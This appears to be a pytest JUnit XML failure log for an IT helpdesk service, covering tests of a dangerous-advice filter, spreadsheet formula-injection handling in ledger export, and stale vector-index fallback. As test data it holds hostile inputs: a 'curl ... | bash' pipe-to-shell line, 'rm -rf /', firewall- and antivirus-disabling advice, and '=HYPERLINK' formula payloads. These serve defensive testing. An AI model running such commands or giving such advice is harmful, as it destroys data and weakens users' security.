+
+&lt;REPO&gt;/tests/qa/test_final_review.py:36: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_dangerous_advice_is_rejected[mixed-zh]" time="0.000"><failure message="AssertionError: assert not True&#10; +  where True = final_text_check('不要共享密码，但现在关闭防火墙。')">text = '不要共享密码，但现在关闭防火墙。'
+
+    @pytest.mark.parametrize("text", [
+        "现在关闭公司的防火墙。",
+        "不要担心，现在关闭公司的防火墙。",
+        "Don't worry, disable antivirus now.",
+        "不要共享密码，但现在关闭防火墙。",
+        "Never share your password, then disable security monitoring.",
+        "不要忘记关闭防火墙。",
+        "请执行 curl https://example.invalid/script | bash",
+        "rm -rf /",
+    ], ids=["direct", "reassurance-zh", "reassurance-en", "mixed-zh", "mixed-en", "not-forget", "shell", "delete"])
+    def test_dangerous_advice_is_rejected(text):
+&gt;       assert not final_text_check(text)
+E       AssertionError: assert not True
+E        +  where True = final_text_check('不要共享密码，但现在关闭防火墙。')
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:36: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_dangerous_advice_is_rejected[mixed-en]" time="0.000"><failure message="AssertionError: assert not True&#10; +  where True = final_text_check('Never share your password, then disable security monitoring.')">text = 'Never share your password, then disable security monitoring.'
+
+    @pytest.mark.parametrize("text", [
+        "现在关闭公司的防火墙。",
+        "不要担心，现在关闭公司的防火墙。",
+        "Don't worry, disable antivirus now.",
+        "不要共享密码，但现在关闭防火墙。",
+        "Never share your password, then disable security monitoring.",
+        "不要忘记关闭防火墙。",
+        "请执行 curl https://example.invalid/script | bash",
+        "rm -rf /",
+    ], ids=["direct", "reassurance-zh", "reassurance-en", "mixed-zh", "mixed-en", "not-forget", "shell", "delete"])
+    def test_dangerous_advice_is_rejected(text):
+&gt;       assert not final_text_check(text)
+E       AssertionError: assert not True
+E        +  where True = final_text_check('Never share your password, then disable security monitoring.')
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:36: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_dangerous_advice_is_rejected[not-forget]" time="0.000"><failure message="AssertionError: assert not True&#10; +  where True = final_text_check('不要忘记关闭防火墙。')">text = '不要忘记关闭防火墙。'
+
+    @pytest.mark.parametrize("text", [
+        "现在关闭公司的防火墙。",
+        "不要担心，现在关闭公司的防火墙。",
+        "Don't worry, disable antivirus now.",
+        "不要共享密码，但现在关闭防火墙。",
+        "Never share your password, then disable security monitoring.",
+        "不要忘记关闭防火墙。",
+        "请执行 curl https://example.invalid/script | bash",
+        "rm -rf /",
+    ], ids=["direct", "reassurance-zh", "reassurance-en", "mixed-zh", "mixed-en", "not-forget", "shell", "delete"])
+    def test_dangerous_advice_is_rejected(text):
+&gt;       assert not final_text_check(text)
+E       AssertionError: assert not True
+E        +  where True = final_text_check('不要忘记关闭防火墙。')
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:36: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_dangerous_advice_is_rejected[shell]" time="0.000" /><testcase classname="tests.qa.test_final_review" name="test_dangerous_advice_is_rejected[delete]" time="0.000" /><testcase classname="tests.qa.test_final_review" name="test_negation_does_not_cover_a_second_action_without_punctuation" time="0.000"><failure message="AssertionError: assert not True&#10; +  where True = final_text_check('不要关闭防火墙但请关闭杀毒软件。')">def test_negation_does_not_cover_a_second_action_without_punctuation():
+&gt;       assert not final_text_check("不要关闭防火墙但请关闭杀毒软件。")
+E       AssertionError: assert not True
+E        +  where True = final_text_check('不要关闭防火墙但请关闭杀毒软件。')
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:40: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_team_publishes_only_reviewed_draft_or_safe_replacement[approved]" time="0.081" /><testcase classname="tests.qa.test_final_review" name="test_team_publishes_only_reviewed_draft_or_safe_replacement[approved-negation]" time="0.066" /><testcase classname="tests.qa.test_final_review" name="test_team_publishes_only_reviewed_draft_or_safe_replacement[original-bypass]" time="0.065"><failure message="assert False is True">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x1097fe2a0&gt;, '63cb8ea23b37472c96de27213e5eac64', 'cf212cfe5c734a72a89e0b0e8ab2409c')
+draft = '不要担心，现在关闭公司的防火墙。', review_mode = 'timeout', replaced = True
+
+    @pytest.mark.parametrize("draft,review_mode,replaced", [
+        ("请记录错误提示并联系 IT。", "approve", False),
+        ("不要共享密码。请记录错误信息。", "approve", False),
+        ("不要担心，现在关闭公司的防火墙。", "timeout", True),
+        # Outside the deterministic regex vocabulary: an unavailable judge cannot approve it.
+        ("Temporarily stop the endpoint protection service to restore access.", "timeout", True),
+        ("请记录错误提示并联系 IT。", "timeout", True),
+        ("请记录错误提示并联系 IT。", "invalid", True),
+        ("请记录错误提示并联系 IT。", "reject", True),
+    ], ids=["approved", "approved-negation", "original-bypass", "uncertain-danger", "benign-timeout", "invalid-review", "rejected"])
+    def test_team_publishes_only_reviewed_draft_or_safe_replacement(runtime, draft, review_mode, replaced):
+        config, db, knowledge, _, owner, _ = runtime
+        config.model_mode = "ollama"
+    
+        class ScriptedModel:
+            def __init__(self):
+                self.config, self.calls = config, []
+    
+            async def ask(self, purpose, instructions, payload, schema=None):
+                self.calls.append({"purpose": purpose})
+                if purpose == "intake":
+                    return heuristic_intake("如何连接 VPN？")
+                if purpose == "priority":
+                    return impact_priority(heuristic_intake("如何连接 VPN？"))
+                if purpose == "draft":
+                    return draft
+                assert purpose == "review" and payload == draft and schema is AnswerReview
+                if review_mode == "timeout":
+                    raise TimeoutError("synthetic reviewer timeout")
+                if review_mode == "invalid":
+                    raise ValueError("synthetic invalid review JSON")
+                return AnswerReview(approved=review_mode == "approve", reason="Synthetic review")
+    
+        model = ScriptedModel()
+    
+        async def scenario():
+            async def emit(_):
+                pass
+            team = ServiceTeam(model, knowledge, ConversationMemory(db, config), GuidanceCatalog(config.skills_directory))
+            return await team.solve(owner, "unused", "如何连接 VPN？", emit)
+    
+        result = asyncio.run(scenario())
+&gt;       assert result["review"]["replacement_used"] is replaced
+E       assert False is True
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:85: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_team_publishes_only_reviewed_draft_or_safe_replacement[uncertain-danger]" time="0.066"><failure message="assert False is True">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x108cdbfb0&gt;, '352b9b82fb4341fbace1403cfbc036d7', '17624ac6bce84cfc855acc6bfb99df89')
+draft = 'Temporarily stop the endpoint protection service to restore access.'
+review_mode = 'timeout', replaced = True
+
+    @pytest.mark.parametrize("draft,review_mode,replaced", [
+        ("请记录错误提示并联系 IT。", "approve", False),
+        ("不要共享密码。请记录错误信息。", "approve", False),
+        ("不要担心，现在关闭公司的防火墙。", "timeout", True),
+        # Outside the deterministic regex vocabulary: an unavailable judge cannot approve it.
+        ("Temporarily stop the endpoint protection service to restore access.", "timeout", True),
+        ("请记录错误提示并联系 IT。", "timeout", True),
+        ("请记录错误提示并联系 IT。", "invalid", True),
+        ("请记录错误提示并联系 IT。", "reject", True),
+    ], ids=["approved", "approved-negation", "original-bypass", "uncertain-danger", "benign-timeout", "invalid-review", "rejected"])
+    def test_team_publishes_only_reviewed_draft_or_safe_replacement(runtime, draft, review_mode, replaced):
+        config, db, knowledge, _, owner, _ = runtime
+        config.model_mode = "ollama"
+    
+        class ScriptedModel:
+            def __init__(self):
+                self.config, self.calls = config, []
+    
+            async def ask(self, purpose, instructions, payload, schema=None):
+                self.calls.append({"purpose": purpose})
+                if purpose == "intake":
+                    return heuristic_intake("如何连接 VPN？")
+                if purpose == "priority":
+                    return impact_priority(heuristic_intake("如何连接 VPN？"))
+                if purpose == "draft":
+                    return draft
+                assert purpose == "review" and payload == draft and schema is AnswerReview
+                if review_mode == "timeout":
+                    raise TimeoutError("synthetic reviewer timeout")
+                if review_mode == "invalid":
+                    raise ValueError("synthetic invalid review JSON")
+                return AnswerReview(approved=review_mode == "approve", reason="Synthetic review")
+    
+        model = ScriptedModel()
+    
+        async def scenario():
+            async def emit(_):
+                pass
+            team = ServiceTeam(model, knowledge, ConversationMemory(db, config), GuidanceCatalog(config.skills_directory))
+            return await team.solve(owner, "unused", "如何连接 VPN？", emit)
+    
+        result = asyncio.run(scenario())
+&gt;       assert result["review"]["replacement_used"] is replaced
+E       assert False is True
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:85: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_team_publishes_only_reviewed_draft_or_safe_replacement[benign-timeout]" time="0.065"><failure message="assert False is True">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x109e16cf0&gt;, '7f371818394c4d9285fef09d89c1da7f', '15611d17195e46d384dca00a384cf9fb')
+draft = '请记录错误提示并联系 IT。', review_mode = 'timeout', replaced = True
+
+    @pytest.mark.parametrize("draft,review_mode,replaced", [
+        ("请记录错误提示并联系 IT。", "approve", False),
+        ("不要共享密码。请记录错误信息。", "approve", False),
+        ("不要担心，现在关闭公司的防火墙。", "timeout", True),
+        # Outside the deterministic regex vocabulary: an unavailable judge cannot approve it.
+        ("Temporarily stop the endpoint protection service to restore access.", "timeout", True),
+        ("请记录错误提示并联系 IT。", "timeout", True),
+        ("请记录错误提示并联系 IT。", "invalid", True),
+        ("请记录错误提示并联系 IT。", "reject", True),
+    ], ids=["approved", "approved-negation", "original-bypass", "uncertain-danger", "benign-timeout", "invalid-review", "rejected"])
+    def test_team_publishes_only_reviewed_draft_or_safe_replacement(runtime, draft, review_mode, replaced):
+        config, db, knowledge, _, owner, _ = runtime
+        config.model_mode = "ollama"
+    
+        class ScriptedModel:
+            def __init__(self):
+                self.config, self.calls = config, []
+    
+            async def ask(self, purpose, instructions, payload, schema=None):
+                self.calls.append({"purpose": purpose})
+                if purpose == "intake":
+                    return heuristic_intake("如何连接 VPN？")
+                if purpose == "priority":
+                    return impact_priority(heuristic_intake("如何连接 VPN？"))
+                if purpose == "draft":
+                    return draft
+                assert purpose == "review" and payload == draft and schema is AnswerReview
+                if review_mode == "timeout":
+                    raise TimeoutError("synthetic reviewer timeout")
+                if review_mode == "invalid":
+                    raise ValueError("synthetic invalid review JSON")
+                return AnswerReview(approved=review_mode == "approve", reason="Synthetic review")
+    
+        model = ScriptedModel()
+    
+        async def scenario():
+            async def emit(_):
+                pass
+            team = ServiceTeam(model, knowledge, ConversationMemory(db, config), GuidanceCatalog(config.skills_directory))
+            return await team.solve(owner, "unused", "如何连接 VPN？", emit)
+    
+        result = asyncio.run(scenario())
+&gt;       assert result["review"]["replacement_used"] is replaced
+E       assert False is True
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:85: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_team_publishes_only_reviewed_draft_or_safe_replacement[invalid-review]" time="0.066"><failure message="assert False is True">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x109e818b0&gt;, '88e3fdd5cf5f4ef087e7617eb79bc7b1', 'cae34a7b214a4874b3a398c2f60e6709')
+draft = '请记录错误提示并联系 IT。', review_mode = 'invalid', replaced = True
+
+    @pytest.mark.parametrize("draft,review_mode,replaced", [
+        ("请记录错误提示并联系 IT。", "approve", False),
+        ("不要共享密码。请记录错误信息。", "approve", False),
+        ("不要担心，现在关闭公司的防火墙。", "timeout", True),
+        # Outside the deterministic regex vocabulary: an unavailable judge cannot approve it.
+        ("Temporarily stop the endpoint protection service to restore access.", "timeout", True),
+        ("请记录错误提示并联系 IT。", "timeout", True),
+        ("请记录错误提示并联系 IT。", "invalid", True),
+        ("请记录错误提示并联系 IT。", "reject", True),
+    ], ids=["approved", "approved-negation", "original-bypass", "uncertain-danger", "benign-timeout", "invalid-review", "rejected"])
+    def test_team_publishes_only_reviewed_draft_or_safe_replacement(runtime, draft, review_mode, replaced):
+        config, db, knowledge, _, owner, _ = runtime
+        config.model_mode = "ollama"
+    
+        class ScriptedModel:
+            def __init__(self):
+                self.config, self.calls = config, []
+    
+            async def ask(self, purpose, instructions, payload, schema=None):
+                self.calls.append({"purpose": purpose})
+                if purpose == "intake":
+                    return heuristic_intake("如何连接 VPN？")
+                if purpose == "priority":
+                    return impact_priority(heuristic_intake("如何连接 VPN？"))
+                if purpose == "draft":
+                    return draft
+                assert purpose == "review" and payload == draft and schema is AnswerReview
+                if review_mode == "timeout":
+                    raise TimeoutError("synthetic reviewer timeout")
+                if review_mode == "invalid":
+                    raise ValueError("synthetic invalid review JSON")
+                return AnswerReview(approved=review_mode == "approve", reason="Synthetic review")
+    
+        model = ScriptedModel()
+    
+        async def scenario():
+            async def emit(_):
+                pass
+            team = ServiceTeam(model, knowledge, ConversationMemory(db, config), GuidanceCatalog(config.skills_directory))
+            return await team.solve(owner, "unused", "如何连接 VPN？", emit)
+    
+        result = asyncio.run(scenario())
+&gt;       assert result["review"]["replacement_used"] is replaced
+E       assert False is True
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:85: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_team_publishes_only_reviewed_draft_or_safe_replacement[rejected]" time="0.066" /><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[equals]" time="0.088"><failure message="AssertionError: assert 'f' == 's'&#10;  &#10;  - s&#10;  + f">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x109ec5220&gt;, 'd505024bba1746cfa5e52eaed672eb83', '5d4803c7b2b3496e92d84eb9d60652be')
+text = '=HYPERLINK("https://example.invalid","电脑无法开机")'
+
+    @pytest.mark.parametrize("text", [
+        '=HYPERLINK("https://example.invalid","电脑无法开机")',
+        "+SUM(1,2)", "-1+2", "@SUM(1,2)",
+        '\t=HYPERLINK("https://example.invalid","tab")', "\r\n=1+1", " =1+1",
+        "#DIV/0!", "电脑无法开机 &amp; &lt;排查&gt; \"说明\" 😀", "第一行\n第二行\t字段",
+    ], ids=["equals", "plus", "minus", "at", "tab-prefix", "crlf-prefix", "space-prefix", "excel-error-token", "unicode-xml", "multiline"])
+    def test_exported_summary_is_literal_and_preserves_text(runtime, text):
+        config, db, _, _, owner, _ = runtime
+        operation = persist_incident(db, owner, text)
+        tools = ActionHandlers(db, config)
+        tools.create_work_order(operation)
+        assert not tools.export_ledger(operation)["reused"]
+        assert tools.export_ledger(operation)["reused"]
+        workbook = load_workbook(config.ledger_file, data_only=False)
+        try:
+            sheet = workbook.active
+            assert sheet.max_row == 2 and sheet.max_column == 6
+&gt;           assert sheet.cell(2, 4).data_type == "s"
+E           AssertionError: assert 'f' == 's'
+E             
+E             - s
+E             + f
+
+&lt;REPO&gt;/tests/qa/test_ledger_text.py:41: AssertionError</failure></testcase><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[plus]" time="0.084" /><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[minus]" time="0.078" /><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[at]" time="0.074" /><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[tab-prefix]" time="0.073" /><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[crlf-prefix]" time="0.073"><failure message="AssertionError: assert '\n=1+1' == '\r\n=1+1'&#10;  &#10;  - &#10;  + &#10;    =1+1">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x109f00380&gt;, 'cc91c2ff63a14b7ba0029cc74b9fb764', '244318ba35f045ec993f7d24c6a4c85a')
+text = '\r\n=1+1'
+
+    @pytest.mark.parametrize("text", [
+        '=HYPERLINK("https://example.invalid","电脑无法开机")',
+        "+SUM(1,2)", "-1+2", "@SUM(1,2)",
+        '\t=HYPERLINK("https://example.invalid","tab")', "\r\n=1+1", " =1+1",
+        "#DIV/0!", "电脑无法开机 &amp; &lt;排查&gt; \"说明\" 😀", "第一行\n第二行\t字段",
+    ], ids=["equals", "plus", "minus", "at", "tab-prefix", "crlf-prefix", "space-prefix", "excel-error-token", "unicode-xml", "multiline"])
+    def test_exported_summary_is_literal_and_preserves_text(runtime, text):
+        config, db, _, _, owner, _ = runtime
+        operation = persist_incident(db, owner, text)
+        tools = ActionHandlers(db, config)
+        tools.create_work_order(operation)
+        assert not tools.export_ledger(operation)["reused"]
+        assert tools.export_ledger(operation)["reused"]
+        workbook = load_workbook(config.ledger_file, data_only=False)
+        try:
+            sheet = workbook.active
+            assert sheet.max_row == 2 and sheet.max_column == 6
+            assert sheet.cell(2, 4).data_type == "s"
+&gt;           assert sheet.cell(2, 4).value == text
+E           AssertionError: assert '\n=1+1' == '\r\n=1+1'
+E             
+E             - 
+E             + 
+E               =1+1
+
+&lt;REPO&gt;/tests/qa/test_ledger_text.py:42: AssertionError</failure></testcase><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[space-prefix]" time="0.088" /><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[excel-error-token]" time="0.077"><failure message="AssertionError: assert 'e' == 's'&#10;  &#10;  - s&#10;  + e">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x1097ebe60&gt;, 'c1c88089632a45b688b977c074ca87e3', 'a890bf32183844b99d9b6a38047f6c0f')
+text = '#DIV/0!'
+
+    @pytest.mark.parametrize("text", [
+        '=HYPERLINK("https://example.invalid","电脑无法开机")',
+        "+SUM(1,2)", "-1+2", "@SUM(1,2)",
+        '\t=HYPERLINK("https://example.invalid","tab")', "\r\n=1+1", " =1+1",
+        "#DIV/0!", "电脑无法开机 &amp; &lt;排查&gt; \"说明\" 😀", "第一行\n第二行\t字段",
+    ], ids=["equals", "plus", "minus", "at", "tab-prefix", "crlf-prefix", "space-prefix", "excel-error-token", "unicode-xml", "multiline"])
+    def test_exported_summary_is_literal_and_preserves_text(runtime, text):
+        config, db, _, _, owner, _ = runtime
+        operation = persist_incident(db, owner, text)
+        tools = ActionHandlers(db, config)
+        tools.create_work_order(operation)
+        assert not tools.export_ledger(operation)["reused"]
+        assert tools.export_ledger(operation)["reused"]
+        workbook = load_workbook(config.ledger_file, data_only=False)
+        try:
+            sheet = workbook.active
+            assert sheet.max_row == 2 and sheet.max_column == 6
+&gt;           assert sheet.cell(2, 4).data_type == "s"
+E           AssertionError: assert 'e' == 's'
+E             
+E             - s
+E             + e
+
+&lt;REPO&gt;/tests/qa/test_ledger_text.py:41: AssertionError</failure></testcase><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[unicode-xml]" time="0.076" /><testcase classname="tests.qa.test_ledger_text" name="test_exported_summary_is_literal_and_preserves_text[multiline]" time="0.076" /><testcase classname="tests.qa.test_ledger_text" name="test_append_keeps_existing_row_and_work_order_status" time="0.079"><failure message="AssertionError: assert 'f' == 's'&#10;  &#10;  - s&#10;  + f">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x109e816d0&gt;, 'b1441a939b074caca99730bd93a019f9', '0559650c6b194dc49cf340c4bfb72727')
+
+    def test_append_keeps_existing_row_and_work_order_status(runtime):
+        config, db, _, _, owner, _ = runtime
+        tools = ActionHandlers(db, config)
+        operations = [persist_incident(db, owner, text) for text in ("原有普通工单", "=1+1")]
+        for operation in operations:
+            tools.create_work_order(operation)
+        with db.session.begin() as session:
+            session.scalar(select(WorkOrder).where(WorkOrder.request_id == operations[1])).phase = "INVESTIGATING"
+        tools.export_ledger(operations[0])
+        tools.export_ledger(operations[1])
+        assert tools.export_ledger(operations[0])["reused"]
+        workbook = load_workbook(config.ledger_file)
+        try:
+            assert workbook.active.max_row == 3
+            assert workbook.active.cell(2, 4).value == "原有普通工单"
+            assert workbook.active.cell(3, 4).value == "=1+1"
+&gt;           assert workbook.active.cell(3, 4).data_type == "s"
+E           AssertionError: assert 'f' == 's'
+E             
+E             - s
+E             + f
+
+&lt;REPO&gt;/tests/qa/test_ledger_text.py:75: AssertionError</failure></testcase><testcase classname="tests.qa.test_ledger_text" name="test_carriage_returns_survive_a_later_append" time="0.075"><failure message="AssertionError: assert '第一行\n第二行' == '第一行\r\n第二行'&#10;  &#10;  - 第一行&#10;  ?    -&#10;  + 第一行&#10;    第二行">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x109e80b00&gt;, '863138069eed424ea97f6105c0f3f644', 'ce85bf99b57447799b0aef199ec99c4f')
+
+    def test_carriage_returns_survive_a_later_append(runtime):
+        config, db, _, _, owner, _ = runtime
+        tools = ActionHandlers(db, config)
+        for text in ("第一行\r\n第二行", "新工单"):
+            operation = persist_incident(db, owner, text)
+            tools.create_work_order(operation)
+            tools.export_ledger(operation)
+        workbook = load_workbook(config.ledger_file)
+        try:
+&gt;           assert workbook.active.cell(2, 4).value == "第一行\r\n第二行"
+E           AssertionError: assert '第一行\n第二行' == '第一行\r\n第二行'
+E             
+E             - 第一行
+E             ?    -
+E             + 第一行
+E               第二行
+
+&lt;REPO&gt;/tests/qa/test_ledger_text.py:90: AssertionError</failure></testcase><testcase classname="tests.qa.test_stale_vectors" name="test_stale_ids_fall_back_to_exact_bm25_and_disable_index[unknown-id]" time="0.066"><failure message="KeyError: 'no-longer-in-sql'">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x109f1b3b0&gt;, '3eb7e44d24f64ea68e31bd8744f79635', 'ead04cf1ad124f77ad4fcfe85ae66f56')
+monkeypatch = &lt;_pytest.monkeypatch.MonkeyPatch object at 0x10a037830&gt;
+kind = 'missing'
+
+    @pytest.mark.parametrize("kind", ["missing", "mixed", "deleted"], ids=["unknown-id", "mixed-valid-stale", "deleted-id"])
+    def test_stale_ids_fall_back_to_exact_bm25_and_disable_index(runtime, monkeypatch, kind):
+        _, db, knowledge, _, _, _ = runtime
+        rows = knowledge.rows()
+        stale = "no-longer-in-sql"
+        if kind == "deleted":
+            stale = rows[0].id
+            with db.session.begin() as session:
+                session.execute(delete(DocumentSegment).where(DocumentSegment.id == stale))
+        baseline = asyncio.run(knowledge.search("VPN"))
+        ids = [stale] if kind != "mixed" else [knowledge.rows()[0].id, stale]
+        collection = attach_vectors(monkeypatch, knowledge, ids)
+&gt;       actual = asyncio.run(knowledge.search("VPN"))
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+&lt;REPO&gt;/tests/qa/test_stale_vectors.py:47: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py:195: in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py:118: in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py:691: in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = &lt;opsdesk.retrieval.KnowledgeIndex object at 0x109f75640&gt;, query = 'VPN'
+limit = 4
+
+    async def search(self, query, limit=4):
+        rows = self.rows()
+        if not rows: return []
+        channels = {"bm25": self.lexical(query, rows)}
+        if self.config.vector_search and self.vector_state.get("ready"):
+            try:
+                identity = await embedding_identity(self.config)
+                if identity != self.vector_state["embedding_identity"]:
+                    self.vector_state.update(ready=False, error="Embedding identity changed; rebuild required")
+                    raise ValueError("Vector model changed")
+                vector = (await embed(self.config, ["search_query: " + query]))[0]
+                result = self.collection.query(query_embeddings=[vector], n_results=min(8, len(rows)))
+                channels["vector"] = list(zip(result["ids"][0], result["distances"][0]))
+            except Exception as exc:
+                self.vector_state["last_query_error"] = type(exc).__name__
+        scores, origins = Counter(), {}
+        for channel, ranking in channels.items():
+            for rank, (key, _) in enumerate(ranking[:12], 1):
+                scores[key] += 1 / (40 + rank)
+                origins.setdefault(key, []).append(channel)
+        lookup = {row.id: row for row in rows}
+        requested = set(terms(query))
+        for key in scores:
+&gt;           affinity = len(requested &amp; set(terms(lookup[key].title))) / max(1, len(requested))
+                                                 ^^^^^^^^^^^
+E           KeyError: 'no-longer-in-sql'
+
+&lt;REPO&gt;/opsdesk/retrieval.py:158: KeyError</failure></testcase><testcase classname="tests.qa.test_stale_vectors" name="test_stale_ids_fall_back_to_exact_bm25_and_disable_index[mixed-valid-stale]" time="0.065"><failure message="KeyError: 'no-longer-in-sql'">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x10a0a0f80&gt;, '1eacf2da583f4411b1809399c1dba6c8', '1be59edc6f0a4a688c5daae200e79fd8')
+monkeypatch = &lt;_pytest.monkeypatch.MonkeyPatch object at 0x10a0a3500&gt;
+kind = 'mixed'
+
+    @pytest.mark.parametrize("kind", ["missing", "mixed", "deleted"], ids=["unknown-id", "mixed-valid-stale", "deleted-id"])
+    def test_stale_ids_fall_back_to_exact_bm25_and_disable_index(runtime, monkeypatch, kind):
+        _, db, knowledge, _, _, _ = runtime
+        rows = knowledge.rows()
+        stale = "no-longer-in-sql"
+        if kind == "deleted":
+            stale = rows[0].id
+            with db.session.begin() as session:
+                session.execute(delete(DocumentSegment).where(DocumentSegment.id == stale))
+        baseline = asyncio.run(knowledge.search("VPN"))
+        ids = [stale] if kind != "mixed" else [knowledge.rows()[0].id, stale]
+        collection = attach_vectors(monkeypatch, knowledge, ids)
+&gt;       actual = asyncio.run(knowledge.search("VPN"))
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+&lt;REPO&gt;/tests/qa/test_stale_vectors.py:47: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py:195: in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py:118: in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py:691: in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = &lt;opsdesk.retrieval.KnowledgeIndex object at 0x109f03bf0&gt;, query = 'VPN'
+limit = 4
+
+    async def search(self, query, limit=4):
+        rows = self.rows()
+        if not rows: return []
+        channels = {"bm25": self.lexical(query, rows)}
+        if self.config.vector_search and self.vector_state.get("ready"):
+            try:
+                identity = await embedding_identity(self.config)
+                if identity != self.vector_state["embedding_identity"]:
+                    self.vector_state.update(ready=False, error="Embedding identity changed; rebuild required")
+                    raise ValueError("Vector model changed")
+                vector = (await embed(self.config, ["search_query: " + query]))[0]
+                result = self.collection.query(query_embeddings=[vector], n_results=min(8, len(rows)))
+                channels["vector"] = list(zip(result["ids"][0], result["distances"][0]))
+            except Exception as exc:
+                self.vector_state["last_query_error"] = type(exc).__name__
+        scores, origins = Counter(), {}
+        for channel, ranking in channels.items():
+            for rank, (key, _) in enumerate(ranking[:12], 1):
+                scores[key] += 1 / (40 + rank)
+                origins.setdefault(key, []).append(channel)
+        lookup = {row.id: row for row in rows}
+        requested = set(terms(query))
+        for key in scores:
+&gt;           affinity = len(requested &amp; set(terms(lookup[key].title))) / max(1, len(requested))
+                                                 ^^^^^^^^^^^
+E           KeyError: 'no-longer-in-sql'
+
